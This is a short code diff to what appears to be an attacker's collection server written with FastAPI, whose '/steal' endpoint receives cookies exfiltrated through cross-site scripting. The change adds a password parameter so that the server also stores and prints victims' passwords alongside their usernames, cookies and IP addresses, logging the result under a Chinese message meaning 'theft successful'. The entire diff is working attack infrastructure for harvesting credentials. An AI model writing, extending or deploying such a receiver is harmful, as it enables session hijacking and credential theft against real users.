@@ -14,15 +14,16 @@ stolen_cookies: list[dict] = []
 
 
 @app.get("/steal")
-def steal(c: str = "", via: str = "xss", user: str = "", request: Request = None):
+def steal(c: str = "", via: str = "xss", user: str = "", password: str = "", request: Request = None):
     entry = {
         "cookie": c,
         "via": via,
         "user": user,
+        "password": password,
         "ip": request.client.host,
     }
     stolen_cookies.append(entry)
-    print(f"[!!!] Cookie窃取成功 | via={via} user={user} cookie={c}")
+    print(f"[!!!] 窃取成功 | via={via} user={user} password={password} cookie={c}")
     return {"status": "ok"}
 
 
